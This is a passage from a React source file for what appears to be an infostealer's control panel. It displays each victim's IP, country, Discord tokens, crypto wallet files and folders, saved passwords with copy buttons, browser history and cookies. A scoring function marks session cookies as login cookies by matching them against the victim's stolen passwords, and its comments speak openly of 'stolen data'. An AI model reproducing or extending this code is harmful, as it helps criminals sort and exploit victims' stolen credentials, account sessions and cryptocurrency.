            '/api/login', '/api/session', '/api/token', '/oauth', '/sso',
            '/identity', '/user', '/profile', '/dashboard'
        ];
        
        const pathMatches = authPaths.some(path => cookiePath.includes(path));
        if (pathMatches) score += 1;
        
        // 6. Correlation with other stolen data (saved passwords)
        if (savedPasswords && hasSavedPasswordForDomain(cookieHost, savedPasswords)) {
            score += 1.5; // Strong correlation if saved password exists for same domain
        }
        
        return score >= THRESHOLD;
    };

    // Process and separate cookies into login and regular
    const processCookies = (cookies, savedPasswords = null) => {
        if (!cookies) {
            return { loginCookies: [], regularCookies: [] };
        }

        // Parse cookies from string if needed
        let cookieArray = [];
        if (typeof cookies === 'string') {
            try {
                cookieArray = JSON.parse(cookies);
            } catch (e) {
                return { loginCookies: [], regularCookies: [] };
            }
        } else if (Array.isArray(cookies)) {
            cookieArray = cookies;
        } else {
            return { loginCookies: [], regularCookies: [] };
        }

        if (cookieArray.length === 0) {
            return { loginCookies: [], regularCookies: [] };
        }

        // Add expiration info and sort
        const processedCookies = cookieArray.map(cookie => ({
            ...cookie,
            expirationInfo: parseExpiration(cookie)
        })).sort((a, b) => {
            // Non-expired cookies first
            if (!a.expirationInfo.isExpired && b.expirationInfo.isExpired) return -1;
            if (a.expirationInfo.isExpired && !b.expirationInfo.isExpired) return 1;
            // If both have same expiration status, sort by expiration date
            if (a.expirationInfo.date && b.expirationInfo.date) {
                if (!a.expirationInfo.isExpired) {
                    return a.expirationInfo.date.getTime() - b.expirationInfo.date.getTime();
                } else {
                    return b.expirationInfo.date.getTime() - a.expirationInfo.date.getTime();
                }
            }
            return 0;
        });

        // Filter based on search query
        let filteredCookies = processedCookies;
        if (debouncedSearchQuery) {
            filteredCookies = processedCookies.filter(cookie => 
                matchesSearch(cookie.host || cookie.domain) || 
                matchesSearch(cookie.name) || 
                matchesSearch(cookie.value) ||
                matchesSearch(cookie.path)
            );
        }

        // Separate into login and regular using enhanced detection
        const loginCookies = filteredCookies.filter(c => isLoginCookie(c, savedPasswords));
        const regularCookies = filteredCookies.filter(c => !isLoginCookie(c, savedPasswords));

        return { loginCookies, regularCookies };
    };

    const renderLoginCookies = (cookies) => {
        // Get saved passwords from pcData for correlation
        const savedPasswords = logData?.pcData?.savedPasswords || null;
        const { loginCookies } = processCookies(cookies, savedPasswords);

        if (loginCookies.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No login cookies found.</Typography>;
        }

        return renderCookieTableContent(loginCookies);
    };

    const renderRegularCookies = (cookies) => {
        // Get saved passwords from pcData for correlation
        const savedPasswords = logData?.pcData?.savedPasswords || null;
        const { regularCookies } = processCookies(cookies, savedPasswords);

        if (regularCookies.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No regular cookies found.</Typography>;
        }

        return renderCookieTableContent(regularCookies);
    };

    const renderSavedPasswords = (passwords) => {
        if (!passwords || passwords.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No saved passwords found.</Typography>;
        }

        const filteredPasswords = debouncedSearchQuery
            ? passwords.filter(pwd => {
                const queryLower = debouncedSearchQuery.toLowerCase();
                return (pwd.origin && pwd.origin.toLowerCase().includes(queryLower)) ||
                       (pwd.username && pwd.username.toLowerCase().includes(queryLower)) ||
                       (pwd.password && pwd.password.toLowerCase().includes(queryLower));
            })
            : passwords;

        if (filteredPasswords.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No passwords match your search query.</Typography>;
        }

        const handleCopyPassword = (password) => {
            navigator.clipboard.writeText(password).then(() => {
                console.log('Password copied to clipboard');
            }).catch(err => {
                console.error('Failed to copy password:', err);
            });
        };

        return (
            <Box>
                <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155' }}>
                    <Table>
                        <TableHead>
                            <TableRow>
                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Origin/URL</TableCell>
                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Username</TableCell>
                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Password</TableCell>
                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Actions</TableCell>
                            </TableRow>
                        </TableHead>
                        <TableBody>
                            {filteredPasswords.map((pwd, index) => (
                                <TableRow key={index} sx={{ '&:hover': { backgroundColor: 'rgba(255, 255, 255, 0.03)' } }}>
                                    <TableCell sx={{ color: '#e2e8f0', maxWidth: '300px', wordBreak: 'break-all' }}>
                                        {pwd.origin || 'N/A'}
                                    </TableCell>
                                    <TableCell sx={{ color: '#94a3b8' }}>
                                        {pwd.username || 'N/A'}
                                    </TableCell>
                                    <TableCell sx={{ color: '#f59e0b', fontFamily: 'monospace' }}>
                                        {pwd.password ? '•'.repeat(Math.min(pwd.password.length, 20)) : 'N/A'}
                                    </TableCell>
                                    <TableCell>
                                        <Button
                                            size="small"
                                            onClick={() => handleCopyPassword(pwd.password || '')}
                                            sx={{
                                                color: '#4ade80',
                                                borderColor: '#4ade80',
                                                '&:hover': {
                                                    borderColor: '#22c55e',
                                                    backgroundColor: 'rgba(74, 222, 128, 0.1)',
                                                }
                                            }}
                                            variant="outlined"
                                        >
                                            Copy Password
                                        </Button>
                                    </TableCell>
                                </TableRow>
                            ))}
                        </TableBody>
                    </Table>
                </TableContainer>
            </Box>
        );
    };

    const renderCryptoWallets = (cryptoWallets) => {
        if (!cryptoWallets || cryptoWallets.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No crypto wallet files found.</Typography>;
        }

        // Filter wallets based on search query
        const filteredWallets = debouncedSearchQuery 
            ? cryptoWallets.filter(wallet => 
                matchesSearch(wallet.walletName) || 
                matchesSearch(wallet.walletType) || 
                matchesSearch(wallet.filePath)
            )
            : cryptoWallets;

        if (filteredWallets.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No crypto wallet files match your search query.</Typography>;
        }

        const formatFileSize = (bytes) => {
            if (bytes < 1024) return `${bytes} B`;
            if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`;
            return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
        };

        const handleDownloadFile = (wallet) => {
            if (wallet.fileContent) {
                try {
                    const binaryString = atob(wallet.fileContent);
                    const bytes = new Uint8Array(binaryString.length);
                    for (let i = 0; i < binaryString.length; i++) {
                        bytes[i] = binaryString.charCodeAt(i);
                    }
                    const blob = new Blob([bytes]);
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = wallet.walletName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                } catch (e) {
                    console.error('Error downloading file:', e);
                }
            }
        };

        return (
            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                {filteredWallets.map((wallet, index) => (
                    <Paper 
                        key={index}
                        sx={{ 
                            backgroundColor: '#252b3b', 
                            border: '1px solid #334155', 
                            borderRadius: '12px', 
                            overflow: 'hidden', 
                            p: 2 
                        }}
                    >
                        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 2 }}>
                            <Box>
                                <Typography variant="h6" sx={{ color: '#4ade80', fontWeight: 600, mb: 0.5 }}>
                                    {wallet.walletName}
                                </Typography>
                                <Chip 
                                    label={wallet.walletType.toUpperCase()} 
                                    size="small" 
                                    sx={{ 
                                        backgroundColor: '#1a1f2e',
                                        color: '#4ade80',
                                        border: '1px solid #334155',
                                        mr: 1
                                    }} 
                                />
                            </Box>
                            {wallet.fileContent && (
                                <Button
                                    variant="outlined"
                                    size="small"
                                    onClick={() => handleDownloadFile(wallet)}
                                    sx={{
                                        color: '#4ade80',
                                        borderColor: '#4ade80',
                                        '&:hover': {
                                            borderColor: '#4ade80',
                                            backgroundColor: 'rgba(74, 222, 128, 0.1)',
                                        }
                                    }}
                                >
                                    Download
                                </Button>
                            )}
                        </Box>
                        <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155', borderRadius: '8px', mb: 2 }}>
                            <Table size="small">
                                <TableBody>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600, width: '30%' }}>File Path</TableCell>
                                        <TableCell sx={{ color: '#94a3b8', wordBreak: 'break-all' }}>{wallet.filePath}</TableCell>
                                    </TableRow>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>File Size</TableCell>
                                        <TableCell sx={{ color: '#94a3b8' }}>{formatFileSize(wallet.fileSize)}</TableCell>
                                    </TableRow>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Last Modified</TableCell>
                                        <TableCell sx={{ color: '#94a3b8' }}>{wallet.lastModified}</TableCell>
                                    </TableRow>
                                    {wallet.fileContent && (
                                        <TableRow>
                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Content Available</TableCell>
                                            <TableCell sx={{ color: '#94a3b8' }}>Yes (Base64 encoded)</TableCell>
                                        </TableRow>
                                    )}
                                </TableBody>
                            </Table>
                        </TableContainer>
                        {wallet.fileContent && wallet.fileSize < 100 * 1024 && (
                            <Paper 
                                sx={{ 
                                    backgroundColor: '#1a1f2e', 
                                    border: '1px solid #334155', 
                                    borderRadius: '8px', 
                                    p: 2,
                                    maxHeight: '200px',
                                    overflow: 'auto'
                                }}
                            >
                                <Typography variant="caption" sx={{ color: '#94a3b8', display: 'block', mb: 1 }}>
                                    File Content Preview (Base64):
                                </Typography>
                                <Typography 
                                    component="pre" 
                                    sx={{ 
                                        margin: 0, 
                                        fontSize: '0.75rem',
                                        color: '#4ade80',
                                        fontFamily: 'monospace',
                                        wordBreak: 'break-all',
                                        whiteSpace: 'pre-wrap'
                                    }}
                                >
                                    {wallet.fileContent.substring(0, 500)}{wallet.fileContent.length > 500 ? '...' : ''}
                                </Typography>
                            </Paper>
                        )}
                    </Paper>
                ))}
            </Box>
        );
    };

    const renderDiscordTokens = (discordTokens) => {
        // Handle both array and single token (for backward compatibility)
        const tokens = Array.isArray(discordTokens) ? discordTokens : (discordTokens ? [discordTokens] : []);
        
        if (tokens.length === 0 || tokens.every(t => !t || t.trim() === '')) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No Discord tokens found.</Typography>;
        }

        // Filter tokens based on search query
        const filteredTokens = debouncedSearchQuery 
            ? tokens.filter(token => token && matchesSearch(token))
            : tokens.filter(token => token && token.trim() !== '');

        if (filteredTokens.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No Discord tokens match your search query.</Typography>;
        }

        const handleCopyToken = (token) => {
            navigator.clipboard.writeText(token).then(() => {
                console.log('Token copied to clipboard');
            }).catch(err => {
                console.error('Failed to copy token:', err);
            });
        };

        return (
            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                {filteredTokens.map((token, index) => (
                    <Paper 
                        key={index}
                        sx={{ 
                            backgroundColor: '#252b3b', 
                            border: '1px solid #334155', 
                            borderRadius: '12px', 
                            overflow: 'hidden', 
                            p: 2 
                        }}
                    >
                        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 2 }}>
                            <Typography variant="h6" sx={{ color: '#4ade80', fontWeight: 600 }}>
                                Discord Token {filteredTokens.length > 1 ? `#${index + 1}` : ''}
                            </Typography>
                            <Tooltip title="Copy token to clipboard">
                                <IconButton 
                                    onClick={() => handleCopyToken(token)}
                                    sx={{ 
                                        color: '#4ade80',
                                        '&:hover': {
                                            backgroundColor: 'rgba(74, 222, 128, 0.1)',
                                        }
                                    }}
                                >
                                    <ContentCopyIcon />
                                </IconButton>
                            </Tooltip>
                        </Box>
                        <Paper 
                            sx={{ 
                                backgroundColor: '#1a1f2e', 
                                border: '1px solid #334155', 
                                borderRadius: '8px', 
                                p: 2,
                                wordBreak: 'break-all',
                                fontFamily: 'monospace',
                                fontSize: '0.9rem',
                                color: '#e2e8f0',
                                position: 'relative'
                            }}
                        >
                            <Typography 
                                component="pre" 
                                sx={{ 
                                    margin: 0, 
                                    whiteSpace: 'pre-wrap',
                                    color: '#4ade80',
                                    fontFamily: 'monospace',
                                }}
                            >
                                {token}
                            </Typography>
                        </Paper>
                        <Typography variant="caption" sx={{ color: '#94a3b8', mt: 1, display: 'block' }}>
                            Token format: {token.startsWith('mfa.') ? 'MFA Token' : 'Standard Token'}
                        </Typography>
                    </Paper>
                ))}
            </Box>
        );
    };

    const renderCryptoWalletFolders = (cryptoWalletFolders) => {
        if (!cryptoWalletFolders || cryptoWalletFolders.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No crypto wallet folders found.</Typography>;
        }

        // Filter folders based on search query
        const filteredFolders = debouncedSearchQuery 
            ? cryptoWalletFolders.filter(folder => 
                matchesSearch(folder.folderName) || 
                matchesSearch(folder.walletType) || 
                matchesSearch(folder.folderPath)
            )
            : cryptoWalletFolders;

        if (filteredFolders.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No crypto wallet folders match your search query.</Typography>;
        }

        const formatFileSize = (bytes) => {
            if (bytes < 1024) return `${bytes} B`;
            if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`;
            if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
            return `${(bytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
        };

        const handleDownloadFolder = (folder) => {
            if (folder.folderContent) {
                try {
                    const binaryString = atob(folder.folderContent);
                    const bytes = new Uint8Array(binaryString.length);
                    for (let i = 0; i < binaryString.length; i++) {
                        bytes[i] = binaryString.charCodeAt(i);
                    }
                    const blob = new Blob([bytes], { type: 'application/zip' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `${folder.folderName}_${folder.walletType}.zip`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                } catch (e) {
                    console.error('Error downloading folder:', e);
                }
            }
        };

        return (
            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                {filteredFolders.map((folder, index) => (
                    <Paper 
                        key={index}
                        sx={{ 
                            backgroundColor: '#252b3b', 
                            border: '1px solid #334155', 
                            borderRadius: '12px', 
                            overflow: 'hidden', 
                            p: 2 
                        }}
                    >
                        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 2 }}>
                            <Box>
                                <Typography variant="h6" sx={{ color: '#4ade80', fontWeight: 600, mb: 0.5 }}>
                                    {folder.folderName} (Complete Folder)
                                </Typography>
                                <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mt: 1 }}>
                                    <Chip 
                                        label={folder.walletType.toUpperCase()} 
                                        size="small" 
                                        sx={{ 
                                            backgroundColor: '#1a1f2e',
                                            color: '#4ade80',
                                            border: '1px solid #334155'
                                        }} 
                                    />
                                    <Chip 
                                        label={`${folder.fileCount} files`} 
                                        size="small" 
                                        sx={{ 
                                            backgroundColor: '#1a1f2e',
                                            color: '#94a3b8',
                                            border: '1px solid #334155'
                                        }} 
                                    />
                                    <Chip 
                                        label={formatFileSize(folder.totalSize)} 
                                        size="small" 
                                        sx={{ 
                                            backgroundColor: '#1a1f2e',
                                            color: '#94a3b8',
                                            border: '1px solid #334155'
                                        }} 
                                    />
                                </Box>
                            </Box>
                            {folder.folderContent && (
                                <Button
                                    variant="outlined"
                                    size="small"
                                    onClick={() => handleDownloadFolder(folder)}
                                    sx={{
                                        color: '#4ade80',
                                        borderColor: '#4ade80',
                                        '&:hover': {
                                            borderColor: '#4ade80',
                                            backgroundColor: 'rgba(74, 222, 128, 0.1)',
                                        }
                                    }}
                                >
                                    Download ZIP
                                </Button>
                            )}
                        </Box>
                        <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155', borderRadius: '8px' }}>
                            <Table size="small">
                                <TableBody>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600, width: '30%' }}>Folder Path</TableCell>
                                        <TableCell sx={{ color: '#94a3b8', wordBreak: 'break-all' }}>{folder.folderPath}</TableCell>
                                    </TableRow>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Total Size</TableCell>
                                        <TableCell sx={{ color: '#94a3b8' }}>{formatFileSize(folder.totalSize)}</TableCell>
                                    </TableRow>
                                    <TableRow>
                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>File Count</TableCell>
                                        <TableCell sx={{ color: '#94a3b8' }}>{folder.fileCount} files</TableCell>
                                    </TableRow>
                                    {folder.folderContent && (
                                        <TableRow>
                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>ZIP Archive</TableCell>
                                            <TableCell sx={{ color: '#94a3b8' }}>Available (Base64 encoded)</TableCell>
                                        </TableRow>
                                    )}
                                </TableBody>
                            </Table>
                        </TableContainer>
                    </Paper>
                ))}
            </Box>
        );
    };

    if (loading) {
        return (
            <Box sx={{ display: 'flex', justifyContent: 'center', p: 3 }}>
                <CircularProgress />
                <Typography sx={{ ml: 2 }}>Loading log details...</Typography>
            </Box>
        );
    }

    if (error) {
        return (
            <Box sx={{ display: 'flex', justifyContent: 'center', p: 3 }}>
                <Typography color="error">{error}</Typography>
            </Box>
        );
    }
    
    if (!logData) {
        return (
            <Box sx={{ display: 'flex', justifyContent: 'center', p: 3 }}>
                <Typography>No log data found.</Typography>
            </Box>
        );
    }

    const { pcData, ip, country, date } = logData;

    // Debug: Log the data structure
    console.log('Full logData:', logData);
    if (pcData) {
        console.log('PC Data structure:', pcData);
        console.log('PC Data keys:', Object.keys(pcData));
        console.log('Screen Size:', pcData.screenSize);
        console.log('Date Time:', pcData.dateTime);
        console.log('IP Address:', pcData.ipAddress);
        console.log('Location:', pcData.location);
        console.log('Browser History type:', typeof pcData.browserHistory);
        console.log('Browser History value:', pcData.browserHistory);
        console.log('Browser History keys:', pcData.browserHistory ? Object.keys(pcData.browserHistory) : 'N/A');
    } else {
        console.log('pcData is null or undefined!');
    }

    return (
        <Box sx={{ p: 3 }}>
            <Button component={Link} to="/" variant="outlined" sx={{ mb: 3, borderRadius: '8px' }}>
                Back to Logs
            </Button>
            <Paper sx={{ p: 3, mb: 3, backgroundColor: '#252b3b', border: '1px solid #334155', borderRadius: '12px' }}>
                <Typography variant="h4" gutterBottom sx={{ color: '#4ade80', mb: 2 }}>
                    Log Details
                </Typography>
                <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1, mb: 3 }}>
                    <Chip label={`ID: ${logId}`} sx={{ mr: 1 }} />
                    <Chip label={`IP: ${ip}`} sx={{ mr: 1 }} />
                    <Chip label={`Country: ${country}`} sx={{ mr: 1 }} />
                    <Chip label={`Date: ${new Date(date).toLocaleString()}`} />
                </Box>
                <TextField
                    fullWidth
                    variant="outlined"
                    placeholder="Search cookies, history, processes, apps, and information..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    sx={{
                        '& .MuiOutlinedInput-root': {
                            backgroundColor: '#1a1f2e',
                            borderRadius: '8px',
                        },
                    }}
                    InputProps={{
                        endAdornment: searchQuery && (
                            <Button
                                size="small"
                                onClick={() => setSearchQuery('')}
                                sx={{
                                    minWidth: 'auto',
                                    color: '#94a3b8',
                                    '&:hover': {
                                        color: '#e2e8f0',
                                    },
                                }}
                            >
                                Clear
                            </Button>
                        ),
                    }}
                />
            </Paper>

            <DataSection title="PC Information" data={pcData} renderFunction={renderPCInformation} />
            {pcData.discordTokens && pcData.discordTokens.length > 0 && (
                <DataSection 
                    title={`Discord Tokens (${pcData.discordTokens.length})`} 
                    data={pcData.discordTokens} 
                    renderFunction={renderDiscordTokens} 
                />
            )}
            {pcData.cryptoWallets && pcData.cryptoWallets.length > 0 && (
                <DataSection 
                    title={`Crypto Wallets (${pcData.cryptoWallets.length})`} 
                    data={pcData.cryptoWallets} 
                    renderFunction={renderCryptoWallets} 
                />
            )}
            {pcData.cryptoWalletFolders && pcData.cryptoWalletFolders.length > 0 && (
                <DataSection 
                    title={`Crypto Wallet Folders (${pcData.cryptoWalletFolders.length})`} 
                    data={pcData.cryptoWalletFolders} 
                    renderFunction={renderCryptoWalletFolders} 
                />
            )}
            <DataSection 
                title={`Browser History (${(() => {
                    if (!pcData.browserHistory) return 0;
                    const bh = pcData.browserHistory;
                    if (Array.isArray(bh)) return bh.length;
                    return (Array.isArray(bh.chromeHistory) ? bh.chromeHistory.length : 0) + 
                           (Array.isArray(bh.firefoxHistory) ? bh.firefoxHistory.length : 0) + 
                           (Array.isArray(bh.edgeHistory) ? bh.edgeHistory.length : 0) + 
                           (Array.isArray(bh.operaHistory) ? bh.operaHistory.length : 0) + 
                           (Array.isArray(bh.braveHistory) ? bh.braveHistory.length : 0);
                })()} total entries)`} 
                data={pcData.browserHistory} 
                renderFunction={renderBrowserHistory} 
            />
            {(() => {
                const cookieCount = (() => {
                    if (!pcData.browserCookies) return 0;
                    if (Array.isArray(pcData.browserCookies)) return pcData.browserCookies.length;
                    if (typeof pcData.browserCookies === 'string') {
                        try {
                            const parsed = JSON.parse(pcData.browserCookies);
                            return Array.isArray(parsed) ? parsed.length : Object.keys(parsed).length;
                        } catch (e) {
                            return 0;
                        }
                    }
                    return 0;
                })();
                
                // Pass saved passwords for correlation analysis
                const savedPasswords = pcData.savedPasswords || null;
                const { loginCookies, regularCookies } = processCookies(pcData.browserCookies, savedPasswords);
                
                return (
                    <>
                        <DataSection 
                            title={`Login Cookies (${loginCookies.length})`} 
                            data={pcData.browserCookies} 
                            renderFunction={renderLoginCookies} 
                        />
                        <DataSection 
                            title={`Regular Cookies (${regularCookies.length})`} 
                            data={pcData.browserCookies} 
                            renderFunction={renderRegularCookies} 
                        />
                    </>
                );
            })()}
            <DataSection 
                title={`Saved Passwords (${pcData.savedPasswords?.length || 0})`} 
                data={pcData.savedPasswords} 
                renderFunction={renderSavedPasswords} 
            />
            <DataSection title={`Installed Apps (${pcData.installedApps?.length || 0})`} data={pcData.installedApps} renderFunction={renderSimpleTable} />
            <DataSection title={`Running Processes (${pcData.runningProcesses?.length || 0})`} data={pcData.runningProcesses} renderFunction={renderProcessesTable} />
        </Box>
    );
};

export default LogDetailPage;
